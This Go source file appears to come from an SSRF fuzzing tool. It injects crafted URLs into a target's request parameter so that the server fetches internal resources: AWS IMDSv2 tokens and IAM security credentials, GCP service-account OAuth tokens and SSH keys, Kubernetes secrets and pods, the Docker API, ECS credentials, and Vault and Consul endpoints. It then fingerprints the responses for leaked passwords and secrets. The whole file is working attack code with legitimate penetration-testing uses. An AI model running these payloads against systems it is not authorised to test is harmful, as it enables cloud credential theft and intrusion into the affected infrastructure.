package fuzzer

import (
	"crypto/tls"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"go-ssrf-fuzzer/models"
)

type Config struct {
	URL           string
	Payloads      []string
	Concurrency   int
	Timeout       time.Duration
	Headers       map[string]string
	ProxyURL      string
	OOBURL        string
	IncludeGCP    bool
	AttemptIMDSv2 bool
	IncludeKube   bool
	IncludeDocker bool
	IncludeECS    bool
	IncludeMesh   bool
}

type PayloadWithHeaders struct {
	URL     string
	Headers map[string]string
}

var Fingerprints = map[string]string{
	"ami-id":                "CRITICAL", // AWS Metadata
	"instance-id":           "CRITICAL", // AWS
	"computeMetadata/v1":    "CRITICAL", // GCP
	"root:x:0:0":            "CRITICAL", // /etc/passwd
	"REDIS":                 "HIGH",     // Redis
	"PostgreSQL":            "HIGH",     // Postgres
	"mysql_native_password": "HIGH",     // MySQL
	"DB_PASSWORD":           "CRITICAL", // Env vars
	"KUBERNETES_SERVICE":    "CRITICAL", // Kubernetes
	"docker-container":      "HIGH",     // Docker
}

func Run(config Config) *models.SSRFResult {
	startTime := time.Now()

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    config.Concurrency,
		MaxConnsPerHost: config.Concurrency,
	}

	if config.ProxyURL != "" {
		proxyURL, _ := url.Parse(config.ProxyURL)
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   config.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}

	f := &fuzzerInstance{client: client, config: config}
	var hits []models.SSRFHit

	// ================================================================
	// PHASE 1: AWS IMDSv2 Token Attempt
	// ================================================================
	if config.AttemptIMDSv2 {
		token := f.attemptIMDSv2Token()
		if token != "" {
			for _, p := range IMDSv2Payloads(token) {
				hit := f.testPayloadWithHeaders(p.URL, p.Headers)
				if hit != nil {
					hit.Severity = "CRITICAL"
					hit.Reason = "AWS IMDSv2 Token Obtained + Metadata Access"
					hits = append(hits, *hit)
				}
			}
		}
	}

	// ================================================================
	// PHASE 2: GCP Metadata with Headers
	// ================================================================
	if config.IncludeGCP {
		for _, p := range GCPMetadataPayloads() {
			hit := f.testPayloadWithHeaders(p.URL, p.Headers)
			if hit != nil {
				if strings.Contains(p.URL, "/token") {
					hit.Severity = "CRITICAL"
					hit.Reason = "GCP OAuth Token Accessible via SSRF"
				} else {
					hit.Severity = "HIGH"
					hit.Reason = "GCP Metadata Accessible with Metadata-Flavor header"
				}
				hits = append(hits, *hit)
			}
		}
	}

	// ================================================================
	// PHASE 3: Kubernetes API
	// ================================================================
	if config.IncludeKube {
		for _, p := range KubernetesPayloads() {
			hit := f.testPayloadWithHeaders(p.URL, p.Headers)
			if hit != nil {
				hit.Severity = "CRITICAL"
				hit.Reason = "Kubernetes API / Kubelet Accessible"
				hits = append(hits, *hit)
			}
		}
	}

	// ================================================================
	// PHASE 4: Docker / ECS / Mesh (Standard payloads but with detection)
	// ================================================================
	advancedPayloads := []string{}
	if config.IncludeDocker {
		advancedPayloads = append(advancedPayloads, DockerPayloads()...)
	}
	if config.IncludeECS {
		advancedPayloads = append(advancedPayloads, ECSPayloads()...)
	}
	if config.IncludeMesh {
		advancedPayloads = append(advancedPayloads, ServiceMeshPayloads()...)
	}

	// Run advanced payloads concurrently
	hitsChan := make(chan models.SSRFHit, len(config.Payloads)+len(advancedPayloads))
	errorsChan := make(chan models.SSRFError, len(config.Payloads)+len(advancedPayloads))

	sem := make(chan struct{}, config.Concurrency)
	var wg sync.WaitGroup

	allPayloads := append([]string{}, config.Payloads...)
	allPayloads = append(allPayloads, advancedPayloads...)

	for _, payload := range allPayloads {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()

			sem <- struct{}{}
			defer func() { <-sem }()

			hit, err := f.testPayload(p)
			if err != nil {
				errorsChan <- models.SSRFError{Payload: p, Error: err.Error()}
				return
			}

			if hit != nil {
				hitsChan <- *hit
			}
		}(payload)
	}

	go func() {
		wg.Wait()
		close(hitsChan)
		close(errorsChan)
	}()

	for h := range hitsChan {
		hits = append(hits, h)
	}
	var errors []models.SSRFError
	for e := range errorsChan {
		errors = append(errors, e)
	}

	duration := time.Since(startTime)

	return &models.SSRFResult{
		Metadata: models.Metadata{
			Target:            config.URL,
			TotalPayloads:     len(allPayloads),
			DurationMs:        duration.Milliseconds(),
			RequestsPerSecond: float64(len(allPayloads)) / duration.Seconds(),
		},
		Hits:   hits,
		Errors: errors,
	}
}

type fuzzerInstance struct {
	client *http.Client
	config Config
}

func (f *fuzzerInstance) testPayload(payload string) (*models.SSRFHit, error) {
	// Prepare Target URL
	fuzzURL := strings.Replace(f.config.URL, "FUZZ", url.QueryEscape(payload), 1)

	req, err := http.NewRequest("GET", fuzzURL, nil)
	if err != nil {
		return nil, err
	}

	for k, v := range f.config.Headers {
		req.Header.Set(k, v)
	}

	// Execute Request
	resp, err := f.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	// Analyze Response
	hit := f.analyzeResponse(payload, resp.StatusCode, bodyStr)
	return hit, nil
}

func (f *fuzzerInstance) testPayloadWithHeaders(payload string, headers map[string]string) *models.SSRFHit {
	fuzzURL := strings.Replace(f.config.URL, "FUZZ", payload, 1)

	req, err := http.NewRequest("GET", fuzzURL, nil)
	if err != nil {
		return nil
	}

	// Add custom headers
	for k, v := range headers {
		req.Header.Set(k, v)
	}

	// Add config headers
	for k, v := range f.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := f.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	bodyStr := string(body)

	return f.analyzeResponse(payload, resp.StatusCode, bodyStr)
}

func (f *fuzzerInstance) analyzeResponse(payload string, statusCode int, body string) *models.SSRFHit {
	// Check fingerprints
	for fp, severity := range Fingerprints {
		if strings.Contains(body, fp) {
			return &models.SSRFHit{
				Payload:          payload,
				ResponseContains: fp,
				StatusCode:       statusCode,
				ResponseLength:   len(body),
				Severity:         severity,
				Reason:           "Fingerprint matched in response body",
			}
		}
	}

	// Advanced detection for specific services
	if f.IsGCPMetadata(body) {
		return &models.SSRFHit{
			Payload:        payload,
			StatusCode:     statusCode,
			ResponseLength: len(body),
			Severity:       "HIGH",
			Reason:         "GCP Metadata Detected",
		}
	}

	if f.IsKubernetesAPI(body) {
		return &models.SSRFHit{
			Payload:        payload,
			StatusCode:     statusCode,
			ResponseLength: len(body),
			Severity:       "CRITICAL",
			Reason:         "Kubernetes API Detected",
		}
	}

	if f.IsDockerAPI(body) {
		return &models.SSRFHit{
			Payload:        payload,
			StatusCode:     statusCode,
			ResponseLength: len(body),
			Severity:       "HIGH",
			Reason:         "Docker API Detected",
		}
	}

	// Heuristic: Successful fetch
	if statusCode == 200 && len(body) > 100 {
		if !strings.Contains(body, "<html>") || strings.Contains(body, "root:") {
			return &models.SSRFHit{
				Payload:        payload,
				StatusCode:     statusCode,
				ResponseLength: len(body),
				Severity:       "MEDIUM",
				Reason:         "Successful 200 OK with non-HTML content",
			}
		}
	}

	return nil
}

func (f *fuzzerInstance) attemptIMDSv2Token() string {
	tokenURL := strings.Replace(f.config.URL, "FUZZ", "http://169.254.169.254/latest/api/token", 1)
	req, err := http.NewRequest("PUT", tokenURL, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")

	resp, err := f.client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		token := strings.TrimSpace(string(body))
		if len(token) > 0 && len(token) < 500 {
			return token
		}
	}
	return ""
}

// Help functions for detection
func (f *fuzzerInstance) IsGCPMetadata(body string) bool {
	fingerprints := []string{"computeMetadata", "service-accounts", "access_token", "google.internal"}
	for _, fp := range fingerprints {
		if strings.Contains(body, fp) {
			return true
		}
	}
	return false
}

func (f *fuzzerInstance) IsKubernetesAPI(body string) bool {
	fingerprints := []string{"apiVersion", "kind", "serviceAccount", "kube-system", "ClusterIP"}
	for _, fp := range fingerprints {
		if strings.Contains(body, fp) {
			return true
		}
	}
	return false
}

func (f *fuzzerInstance) IsDockerAPI(body string) bool {
	fingerprints := []string{"ContainerConfig", "HostConfig", "NetworkSettings", "ApiVersion"}
	for _, fp := range fingerprints {
		if strings.Contains(body, fp) {
			return true
		}
	}
	return false
}

// Payload Generators
func GCPMetadataPayloads() []PayloadWithHeaders {
	endpoints := []string{
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
		"http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys",
		"http://169.254.169.254/computeMetadata/v1/",
	}
	var payloads []PayloadWithHeaders
	for _, e := range endpoints {
		payloads = append(payloads, PayloadWithHeaders{
			URL:     e,
			Headers: map[string]string{"Metadata-Flavor": "Google"},
		})
	}
	return payloads
}

func IMDSv2Payloads(token string) []PayloadWithHeaders {
	endpoints := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://169.254.169.254/latest/user-data/",
	}
	var payloads []PayloadWithHeaders
	for _, e := range endpoints {
		payloads = append(payloads, PayloadWithHeaders{
			URL:     e,
			Headers: map[string]string{"X-aws-ec2-metadata-token": token},
		})
	}
	return payloads
}

func KubernetesPayloads() []PayloadWithHeaders {
	endpoints := []string{
		"https://kubernetes.default.svc/api/v1/namespaces",
		"https://kubernetes.default.svc/api/v1/secrets",
		"https://kubernetes:443/api/v1/pods",
		"http://127.0.0.1:10255/pods",
		"http://127.0.0.1:10250/pods",
	}
	var payloads []PayloadWithHeaders
	for _, e := range endpoints {
		payloads = append(payloads, PayloadWithHeaders{URL: e})
	}
	return payloads
}

func DockerPayloads() []string {
	return []string{
		"http://127.0.0.1:2375/version",
		"http://127.0.0.1:2375/containers/json",
		"http://host.docker.internal:2375/version",
	}
}

func ECSPayloads() []string {
	return []string{
		"http://169.254.170.2/v2/metadata",
		"http://169.254.170.2/v2/credentials",
	}
}

func ServiceMeshPayloads() []string {
	return []string{
		"http://127.0.0.1:8500/v1/agent/self",
		"http://127.0.0.1:8200/v1/sys/health",
		"http://127.0.0.1:9090/api/v1/targets",
		"http://127.0.0.1:9200/",
	}
}
